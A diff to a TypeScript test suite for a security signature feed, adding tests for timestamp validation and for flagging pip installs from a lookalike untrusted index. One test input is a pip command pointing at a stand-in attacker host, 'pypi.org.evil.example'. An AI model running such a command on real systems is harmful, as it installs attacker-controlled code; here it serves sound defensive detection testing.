@@ -20,7 +20,7 @@ const EntryDefaults = {
 	updatedAt: "2026-10-03T00:00:00.000Z",
 };
 
-const FeedVersionPattern = /^[0-9a-f]{8}$/;
+const FeedVersionPattern = /^[0-9a-f]{64}$/;
 
 function entry(overrides: Partial<Signature>): string {
 	const signature: Signature = {
@@ -71,6 +71,14 @@ describe("signature feed loading", () => {
 		expect(parsed.errors.length).toBeGreaterThan(0);
 	});
 
+	it("rejects entries with malformed timestamps", () => {
+		const parsed = parseSignatureFeed(
+			feedOf(entry({ id: "good" }), entry({ addedAt: "yesterday", id: "bad-ts" })),
+		);
+		expect(idsOf(parsed.feed)).toEqual(["good"]);
+		expect(parsed.errors.length).toBeGreaterThan(0);
+	});
+
 	it("skips duplicate ids", () => {
 		const parsed = parseSignatureFeed(feedOf(entry({ id: "dup" }), entry({ id: "dup" })));
 		expect(idsOf(parsed.feed)).toEqual(["dup"]);
@@ -117,6 +125,20 @@ describe("signature matching: exploit patterns", () => {
 			feed.signatures,
 		);
 		expect(matches.map((match) => match.signatureId)).toContain("supply-model-resolve-url");
+	});
+
+	it("treats lookalike official hosts as untrusted", () => {
+		const matches = matchSignatures(
+			"pip3 install --index-url https://pypi.org.evil.example/simple pkg",
+			feed.signatures,
+		);
+		expect(matches.map((match) => match.signatureId)).toContain("supply-pip-untrusted-index");
+	});
+
+	it("leaves the real PyPI index alone", () => {
+		expect(
+			matchSignatures("pip3 install --index-url https://pypi.org/simple pkg", feed.signatures),
+		).toEqual([]);
 	});
 });
 
